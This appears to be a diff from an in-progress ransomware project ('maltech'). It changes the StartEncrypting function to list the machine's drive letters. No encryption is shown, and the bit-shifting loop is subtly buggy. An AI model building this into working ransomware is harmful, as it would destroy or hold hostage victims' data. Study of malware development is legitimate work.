@@ -17,7 +17,14 @@ namespace maltech {
 
         void Ransomware::StartEncrypting() {
             DWORD drivers = GetLogicalDrives();
-            std::cout << "Found drivers: " << drivers << std::endl;
+            const int bits_in_byte = 8;
+            const int dword_bits_size = sizeof(DWORD) * bits_in_byte;
+            for (DWORD i = 0; i <= dword_bits_size; ++i) {
+                DWORD bit_checker = 1;
+                if ((bit_checker << (dword_bits_size - i)) & drivers) {
+                    std::cout << static_cast<char>('A' + dword_bits_size - i) << std::endl;
+                }
+            }
         }
 
     }
